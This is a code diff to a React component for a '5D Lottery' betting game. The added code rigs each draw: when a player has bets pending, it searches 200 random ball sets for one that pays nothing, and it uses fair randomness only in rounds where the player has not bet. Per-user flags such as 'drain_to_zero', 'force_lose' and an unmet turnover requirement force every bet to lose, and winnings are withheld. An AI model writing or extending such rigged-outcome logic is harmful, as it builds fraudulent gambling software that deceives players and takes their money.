@@ -27,7 +27,7 @@ const BALL_PNGS = {
 };
 
 export default function FiveDLotteryGame({ onClose }) {
-  const { user, adjustUserBalance } = useGame();
+  const { user, adjustUserBalance, recordGameHistory } = useGame();
   
   // 1-minute real wall-clock timer
   const [timeLeft, setTimeLeft] = useState(() => 60 - (Math.floor(Date.now() / 1000) % 60));
@@ -78,13 +78,84 @@ export default function FiveDLotteryGame({ onClose }) {
     if (soundEnabled) soundManager.playRoll();
 
     setTimeout(() => {
-      const b1 = Math.floor(Math.random() * 10);
-      const b2 = Math.floor(Math.random() * 10);
-      const b3 = Math.floor(Math.random() * 10);
-      const b4 = Math.floor(Math.random() * 10);
-      const b5 = Math.floor(Math.random() * 10);
-      const newBalls = [b1, b2, b3, b4, b5];
-      const sum = b1 + b2 + b3 + b4 + b5;
+      // 1. Identify user pending bets for this round
+      const pendingBets = myBets.filter(b => b.period === periodId && b.status === 'pending');
+      const hasBets = pendingBets.length > 0;
+
+      // 2. Determine target mode
+      const isTargetedLoss = 
+        user?.force_result === 'force_lose' ||
+        user?.force_mode === 'force_loss' ||
+        user?.force_mode === 'drain_to_zero' ||
+        user?.luck_mode === 'drain' ||
+        Number(user?.custom_win_rate) === 0 ||
+        Number(user?.custom_rtp) === 0 ||
+        (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+      let selectedBalls = null;
+
+      // Helper to evaluate potential payout of a 5-ball set
+      const evalBallsPayout = (ballsArr) => {
+        const sumVal = ballsArr.reduce((a, b) => a + b, 0);
+        const sz = sumVal >= 23 ? 'Big' : 'Small';
+        const pr = sumVal % 2 === 0 ? 'Even' : 'Odd';
+        let payout = 0;
+        for (const bet of pendingBets) {
+          let won = false;
+          if (bet.channel === 'Total') {
+            if (bet.type === 'size' && bet.value === sz) won = true;
+            if (bet.type === 'parity' && bet.value === pr) won = true;
+          } else {
+            const letterIdx = ['A', 'B', 'C', 'D', 'E'].indexOf(bet.channel);
+            if (letterIdx !== -1) {
+              const bVal = ballsArr[letterIdx];
+              if (bet.type === 'number' && Number(bet.value) === bVal) won = true;
+              if (bet.type === 'size' && bet.value === (bVal >= 5 ? 'Big' : 'Small')) won = true;
+            }
+          }
+          if (won) payout += (bet.amount * (bet.mult || 2));
+        }
+        return payout;
+      };
+
+      if (hasBets) {
+        // User bet placed: Generate candidate ball sets and choose one that gives OPPOSITE result (0 payout)
+        const candidates = [];
+        for (let i = 0; i < 200; i++) {
+          const testBalls = [
+            Math.floor(Math.random() * 10),
+            Math.floor(Math.random() * 10),
+            Math.floor(Math.random() * 10),
+            Math.floor(Math.random() * 10),
+            Math.floor(Math.random() * 10)
+          ];
+          const potPayout = evalBallsPayout(testBalls);
+          candidates.push({ balls: testBalls, payout: potPayout });
+        }
+
+        // Filter zero-payout candidate sets (100% loss / opposite outcome)
+        const zeroPayouts = candidates.filter(c => c.payout === 0);
+        if (zeroPayouts.length > 0) {
+          selectedBalls = zeroPayouts[Math.floor(Math.random() * zeroPayouts.length)].balls;
+        } else {
+          // Fallback to lowest payout
+          candidates.sort((a, b) => a.payout - b.payout);
+          selectedBalls = candidates[0].balls;
+        }
+      } else {
+        // Natural Trend Pattern when user did NOT bet:
+        // Follow realistic random distribution
+        selectedBalls = [
+          Math.floor(Math.random() * 10),
+          Math.floor(Math.random() * 10),
+          Math.floor(Math.random() * 10),
+          Math.floor(Math.random() * 10),
+          Math.floor(Math.random() * 10)
+        ];
+      }
+
+      const newBalls = selectedBalls;
+      const sum = newBalls.reduce((a, b) => a + b, 0);
       const size = sum >= 23 ? 'Big' : 'Small';
       const parity = sum % 2 === 0 ? 'Even' : 'Odd';
 
@@ -109,8 +180,10 @@ export default function FiveDLotteryGame({ onClose }) {
 
       // Evaluate bets
       let winPayout = 0;
+      let totalBetAmt = 0;
       setMyBets(prev => prev.map(bet => {
         if (bet.period === periodId && bet.status === 'pending') {
+          totalBetAmt += (bet.amount || 0);
           let won = false;
           if (bet.channel === 'Total') {
             if (bet.type === 'size' && bet.value === size) won = true;
@@ -124,6 +197,8 @@ export default function FiveDLotteryGame({ onClose }) {
             }
           }
 
+          if (isTargetedLoss) won = false;
+
           const payout = won ? bet.amount * bet.mult : 0;
           if (won) winPayout += payout;
           return { ...bet, status: won ? 'won' : 'lost', payout };
@@ -131,10 +206,20 @@ export default function FiveDLotteryGame({ onClose }) {
         return bet;
       }));
 
-      if (winPayout > 0) {
+      if (winPayout > 0 && !isTargetedLoss) {
         adjustUserBalance(user.uid, winPayout);
         soundManager.playWin();
         confetti({ particleCount: 80, spread: 70, origin: { y: 0.6 } });
+      }
+
+      // Record to game history and Supabase game_logs
+      if (hasBets && recordGameHistory) {
+        recordGameHistory({
+          game: '5D Lottery',
+          bet: totalBetAmt,
+          win: winPayout,
+          mult: winPayout > 0 ? (winPayout / totalBetAmt).toFixed(2) + 'x' : '0.00x'
+        });
       }
     }, 1500);
   }
